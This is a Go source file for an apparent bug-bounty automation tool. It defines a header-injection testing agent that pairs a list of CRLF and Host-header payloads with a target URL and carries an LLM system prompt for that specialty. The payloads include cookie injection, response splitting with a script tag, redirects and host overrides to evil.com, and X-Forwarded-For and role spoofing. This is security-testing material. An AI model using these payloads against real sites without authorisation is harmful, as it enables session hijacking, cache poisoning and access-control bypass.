// Package headerinjection implements the CRLF / Header Injection specialist agent.
package headerinjection

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "Header Injection Agent" }
func (a *Agent) ID() string           { return "header_injection" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, p := range payloads {
		findings = append(findings, &base.Finding{
			Type:       "Header Injection",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   mapSeverity(priority),
			Confidence: 0.0,
			Evidence:   map[string]interface{}{"technique": p.technique, "impact": p.impact},
			Method:     "GET",
		})
	}
	return findings, nil
}

type headerPayload struct {
	payload   string
	technique string
	impact    string
}

var payloads = []headerPayload{
	// CRLF injection
	{"%0d%0aInjected-Header:%20true", "crlf_basic", "header_injection"},
	{"%0d%0aSet-Cookie:%20session=hijacked", "crlf_cookie", "session_hijack"},
	{"%0d%0a%0d%0a<script>alert(1)</script>", "crlf_xss", "xss_escalation"},
	{"%0d%0aLocation:%20https://evil.com", "crlf_redirect", "open_redirect"},
	// Double encoding
	{"%250d%250aInjected:%20true", "double_encoded_crlf", "header_injection"},
	// Unicode variants
	{"%E5%98%8A%E5%98%8DInjected:%20true", "unicode_crlf", "header_injection"},
	// Host header injection
	{"evil.com", "host_override", "cache_poisoning"},
	{"target.com\r\nX-Forwarded-Host: evil.com", "host_crlf", "ssrf_escalation"},
	// X-header manipulation
	{"127.0.0.1", "x_forwarded_for", "ip_bypass"},
	{"admin", "x_forwarded_role", "auth_bypass"},
}

func mapSeverity(p string) string {
	switch strings.ToLower(p) {
	case "critical":
		return "high"
	default:
		return "medium"
	}
}

const defaultSystemPrompt = `You are an expert Header Injection / CRLF specialist with expertise in:
- CRLF injection via %0d%0a and encoding variants
- Host header poisoning for cache attacks
- Response splitting for XSS escalation
- Cookie injection via Set-Cookie header
- IP bypass via X-Forwarded-For manipulation

RULES:
1. CRLF with XSS escalation is HIGH severity
2. Host header poisoning is MEDIUM-HIGH severity
3. Test multiple CRLF encoding variants
4. Check for response splitting (double CRLF)
5. Try Host header override for cache poisoning`
